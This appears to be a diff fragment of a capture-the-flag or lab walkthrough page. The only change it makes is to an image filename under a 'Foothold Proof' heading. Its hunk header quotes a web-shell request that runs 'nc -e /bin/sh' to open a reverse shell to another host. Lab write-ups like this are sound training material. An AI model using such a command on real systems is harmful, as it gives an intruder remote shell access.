@@ -175,7 +175,7 @@ http://192.168.78.56:8295/backdoor.php?cmd=nc -e /bin/sh 192.168.49.78 8295
 
 ## Foothold Proof
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Upon going back a directory, we find config.php
 
